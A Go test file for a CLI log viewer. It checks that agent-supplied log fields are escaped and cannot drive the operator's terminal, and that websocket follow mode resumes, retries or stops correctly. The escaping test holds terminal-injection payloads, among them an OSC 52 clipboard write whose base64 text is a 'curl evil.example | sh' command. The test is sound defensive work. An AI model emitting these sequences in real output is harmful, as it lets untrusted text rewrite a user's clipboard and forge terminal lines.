package cmd

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"reflect"
	"slices"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/coder/websocket"

	slclient "github.com/bluesky-social/slagworks/cmd/slagctl/client"
	"github.com/bluesky-social/slagworks/internal/cli/clientauth"
	"github.com/bluesky-social/slagworks/internal/slogkit"
	"github.com/bluesky-social/slagworks/internal/ws"
)

// TestHumanRenderer_EscapesTerminalControls: agent envelopes reach global
// through the site's unauthenticated /logs/ingest, so every string field is
// text the sending host chose. `slagctl machine logs` must not let it drive
// the operator's terminal: an OSC 52 sequence would rewrite the clipboard,
// CSI sequences would erase the screen or forge lines, and an embedded
// newline would print a second, fake log line.
func TestHumanRenderer_EscapesTerminalControls(t *testing.T) {
	f, err := os.CreateTemp(t.TempDir(), "machine-logs")
	if err != nil {
		t.Fatal(err)
	}
	render := humanRenderer(f)
	envs := []slogkit.Envelope{
		{
			TS:     time.Now(),
			Source: slogkit.SourceAgent,
			Host:   "h\x1b[2Jost",
			Phase:  "partitioning\x1b]8;;http://evil.example/\x07",
			Msg:    "ok\x1b]52;c;Y3VybCBldmlsLmV4YW1wbGUgfCBzaAo=\x07 done\n12:00:00.000 [global] host op=00000000 operation completed",
		},
		{
			TS:     time.Now(),
			Source: slogkit.SourceAgent,
			Msg:    "exec",
			Extra: map[string]any{
				"argv":      "sgdisk \x1b[1A\x1b[2Kfake line",
				"exit_code": float64(1),
				"err":       "boom\r\x1b[32mOK\u009b2J",
			},
		},
		{TS: time.Now(), Source: slogkit.Source("global\x1b[1A"), MachineName: "db1\x1b]0;title\x07", Msg: "claimed"},
	}
	for _, env := range envs {
		if err := render(env, 1); err != nil {
			t.Fatal(err)
		}
	}
	if err := f.Close(); err != nil {
		t.Fatal(err)
	}
	raw, err := os.ReadFile(f.Name())
	if err != nil {
		t.Fatal(err)
	}
	out := string(raw)

	lines := strings.Split(strings.TrimSuffix(out, "\n"), "\n")
	if len(lines) != len(envs) {
		t.Errorf("rendered %d lines for %d envelopes (an embedded newline forged a line):\n%s", len(lines), len(envs), out)
	}
	for _, line := range lines {
		for _, r := range line {
			if r < 0x20 || r == 0x7f || (r >= 0x80 && r < 0xa0) {
				t.Errorf("rendered line carries terminal control %U: %q", r, line)
				break
			}
		}
	}
	// The operator still sees that something was there, as visible text.
	for _, want := range []string{
		`h\x1b[2Jost`, `phase=partitioning\x1b]8;;`, `ok\x1b]52;c;`, `\x07 done\n12:00:00.000`,
		`exec: sgdisk \x1b[1A\x1b[2Kfake line → exit 1 err=boom\r\x1b[32mOK\u009b2J`,
		`[global\x1b[1A] db1\x1b]0;title\x07`,
	} {
		if !strings.Contains(out, want) {
			t.Errorf("output missing the escaped text %q:\n%s", want, out)
		}
	}
}

// logsStreamServer numbers each request to /api/v1/logs/stream from 1 and
// hands it to handle, which may refuse it with an HTTP status or upgrade it
// with acceptLogsSubscribe. It points the slagctl globals at itself and
// returns the request count.
func logsStreamServer(t *testing.T, handle func(n int, w http.ResponseWriter, r *http.Request)) *atomic.Int64 {
	t.Helper()
	var reqs atomic.Int64
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		handle(int(reqs.Add(1)), w, r)
	}))
	t.Cleanup(srv.Close)
	prevURL, prevClient := apiURL, apiClient
	apiURL = srv.URL
	apiClient = slclient.New(slclient.Config{BaseURL: srv.URL, HTTPClient: srv.Client(),
		Bearer: func(context.Context) (string, error) { return "stream-test-token", nil }})
	t.Cleanup(func() { apiURL, apiClient = prevURL, prevClient })
	return &reqs
}

// acceptLogsSubscribe upgrades r, reads the subscribe message and
// acknowledges it the way handleLogsStream does. The caller's deferred
// CloseNow drops the connection without a close frame, the way a proxy
// rollout or a load balancer idle timeout ends it.
func acceptLogsSubscribe(w http.ResponseWriter, r *http.Request) (*websocket.Conn, ws.LogStreamSubscribeMsg, bool) {
	var sub ws.LogStreamSubscribeMsg
	c, err := websocket.Accept(w, r, nil)
	if err != nil {
		return nil, sub, false
	}
	_, raw, err := c.Read(r.Context())
	var env ws.Envelope
	if err != nil || json.Unmarshal(raw, &env) != nil || json.Unmarshal(env.Data, &sub) != nil {
		_ = c.CloseNow()
		return nil, sub, false
	}
	ack, _ := ws.MarshalEnvelope(ws.TypeSubscribed, "", ws.SubscribedMsg{})
	_ = c.Write(r.Context(), websocket.MessageText, ack)
	return c, sub, true
}

func sendLogEnvelope(ctx context.Context, c *websocket.Conn, id int64) {
	buf, _ := ws.MarshalEnvelope(ws.TypeLogStreamEnvelope, "", ws.LogStreamEnvelopeMsg{
		ID: id, Envelope: slogkit.Envelope{TS: time.Now().UTC(), Level: slogkit.LevelInfo, Source: slogkit.SourceSite, Msg: "line"},
	})
	_ = c.Write(ctx, websocket.MessageText, buf)
}

// followLogs runs runLogsStream in follow mode until it returns or has
// rendered want envelopes, then reports the ids rendered and its error.
func followLogs(t *testing.T, sub ws.LogStreamSubscribeMsg, want int) ([]int64, error) {
	t.Helper()
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()
	var mu sync.Mutex
	var ids []int64
	err := runLogsStream(ctx, sub, func(_ slogkit.Envelope, id int64) error {
		mu.Lock()
		defer mu.Unlock()
		ids = append(ids, id)
		if len(ids) == want {
			cancel()
		}
		return nil
	}, true)
	mu.Lock()
	defer mu.Unlock()
	return ids, err
}

// TestMachineLogsFollow_ResumesAfterDrop: `slagctl machine logs -f` must
// survive a dropped stream. A proxy rollout, the load balancer's idle
// timeout on a quiet machine and a global restart all drop it. The server
// resumes past last_seen_id (handleLogsStream), so follow redials with the
// caller's filter and last_seen_id set to the highest id it rendered, and
// the operator sees every line once.
func TestMachineLogsFollow_ResumesAfterDrop(t *testing.T) {
	want := ws.LogStreamSubscribeMsg{
		MachineID:      "8b2e3f00-0000-4000-8000-000000000001",
		TraceID:        "8b2e3f00-0000-4000-8000-000000000002",
		Sources:        []string{"agent", "site"},
		MinLevel:       "info",
		SinceTimestamp: "2026-01-02T03:04:05Z",
	}
	var mu sync.Mutex
	var resub *ws.LogStreamSubscribeMsg
	logsStreamServer(t, func(n int, w http.ResponseWriter, r *http.Request) {
		c, sub, ok := acceptLogsSubscribe(w, r)
		if !ok {
			return
		}
		defer c.CloseNow() //nolint:errcheck
		if n == 1 {
			sendLogEnvelope(r.Context(), c, 1)
			sendLogEnvelope(r.Context(), c, 2)
			return // dropped without a close frame
		}
		mu.Lock()
		resub = &sub
		mu.Unlock()
		for id := sub.LastSeenID + 1; id <= 3; id++ {
			sendLogEnvelope(r.Context(), c, id)
		}
		readOne(r.Context(), c) // returns when the client closes
	})

	ids, err := followLogs(t, want, 3)
	if !slices.Equal(ids, []int64{1, 2, 3}) {
		t.Fatalf("follow rendered ids %v and returned %v; want 1, 2, 3 with a second connection resuming after 2", ids, err)
	}
	mu.Lock()
	defer mu.Unlock()
	want.LastSeenID = 2
	if !reflect.DeepEqual(resub, &want) {
		t.Fatalf("second subscribe = %+v, want the caller's filter with last_seen_id 2: %+v", resub, want)
	}
}

// TestMachineLogsFollow_RetriesServerSideFailure: while global restarts,
// the load balancer answers the redial with a 5xx. Follow keeps redialing
// and resumes once global is back.
func TestMachineLogsFollow_RetriesServerSideFailure(t *testing.T) {
	logsStreamServer(t, func(n int, w http.ResponseWriter, r *http.Request) {
		if n == 2 {
			http.Error(w, "no healthy upstream", http.StatusBadGateway)
			return
		}
		c, sub, ok := acceptLogsSubscribe(w, r)
		if !ok {
			return
		}
		defer c.CloseNow() //nolint:errcheck
		sendLogEnvelope(r.Context(), c, sub.LastSeenID+1)
		if n == 1 {
			return
		}
		readOne(r.Context(), c) // returns when the client closes
	})
	ids, err := followLogs(t, ws.LogStreamSubscribeMsg{}, 2)
	if !slices.Equal(ids, []int64{1, 2}) {
		t.Fatalf("follow rendered ids %v and returned %v; want 1, then 2 from the connection after the 502", ids, err)
	}
}

// TestMachineLogsFollow_StopsOnPermanentFailure: follow redials only a
// stream that dropped. An error a redial would repeat ends the command with
// that error.
func TestMachineLogsFollow_StopsOnPermanentFailure(t *testing.T) {
	cases := []struct {
		name     string
		handle   func(n int, w http.ResponseWriter, r *http.Request)
		wantErr  string
		wantReqs int64
		wantIDs  []int64
	}{
		{
			// Global unreachable or misconfigured at start: report it rather
			// than wait for it.
			name: "first connection fails",
			handle: func(_ int, w http.ResponseWriter, _ *http.Request) {
				http.Error(w, "no healthy upstream", http.StatusServiceUnavailable)
			},
			wantErr:  "503",
			wantReqs: 1,
		},
		{
			name: "server sends an error frame",
			handle: func(_ int, w http.ResponseWriter, r *http.Request) {
				c, _, ok := acceptLogsSubscribe(w, r)
				if !ok {
					return
				}
				defer c.CloseNow() //nolint:errcheck
				sendLogEnvelope(r.Context(), c, 1)
				buf, _ := ws.MarshalEnvelope(ws.TypeError, "", ws.ErrorMsg{Code: "query_error", Message: "store unavailable"})
				_ = c.Write(r.Context(), websocket.MessageText, buf)
			},
			wantErr:  "query_error",
			wantReqs: 1,
			wantIDs:  []int64{1},
		},
		{
			// The proxy in front of global answers an expired login with a
			// 4xx (or a redirect to its login page): redialing cannot fix it.
			name: "redial refused",
			handle: func(n int, w http.ResponseWriter, r *http.Request) {
				if n > 1 {
					http.Error(w, "login required", http.StatusUnauthorized)
					return
				}
				c, _, ok := acceptLogsSubscribe(w, r)
				if !ok {
					return
				}
				defer c.CloseNow() //nolint:errcheck
				sendLogEnvelope(r.Context(), c, 1)
			},
			wantErr:  "401",
			wantReqs: 2,
			wantIDs:  []int64{1},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			reqs := logsStreamServer(t, tc.handle)
			ids, err := followLogs(t, ws.LogStreamSubscribeMsg{}, -1)
			if err == nil || errors.Is(err, context.Canceled) || errors.Is(err, context.DeadlineExceeded) || !strings.Contains(err.Error(), tc.wantErr) {
				t.Fatalf("follow returned %v, want an error mentioning %q", err, tc.wantErr)
			}
			if got := reqs.Load(); got != tc.wantReqs {
				t.Errorf("server saw %d stream requests, want %d", got, tc.wantReqs)
			}
			if !slices.Equal(ids, tc.wantIDs) {
				t.Errorf("follow rendered ids %v, want %v", ids, tc.wantIDs)
			}
		})
	}
}

// TestMachineLogsFollow_StopsWhenSignInIsGone: each redial fetches the
// access token afresh. When that needs a new login, follow ends with the
// error instead of asking the identity provider again on every retry.
func TestMachineLogsFollow_StopsWhenSignInIsGone(t *testing.T) {
	reqs := logsStreamServer(t, func(_ int, w http.ResponseWriter, r *http.Request) {
		c, _, ok := acceptLogsSubscribe(w, r)
		if !ok {
			return
		}
		defer c.CloseNow() //nolint:errcheck
		sendLogEnvelope(r.Context(), c, 1)
	})
	var asked atomic.Int64
	apiClient = slclient.New(slclient.Config{BaseURL: apiURL, Bearer: func(context.Context) (string, error) {
		if asked.Add(1) > 1 {
			return "", fmt.Errorf("%w: the identity provider refused the refresh token", clientauth.ErrLoginRequired)
		}
		return "stream-test-token", nil
	}})

	ids, err := followLogs(t, ws.LogStreamSubscribeMsg{}, -1)
	if !errors.Is(err, clientauth.ErrLoginRequired) {
		t.Fatalf("follow returned %v, want the sign-in error", err)
	}
	if asked.Load() != 2 || reqs.Load() != 1 {
		t.Errorf("token asked for %d times and %d stream requests sent, want 2 and 1", asked.Load(), reqs.Load())
	}
	if !slices.Equal(ids, []int64{1}) {
		t.Errorf("follow rendered ids %v, want [1]", ids)
	}
}
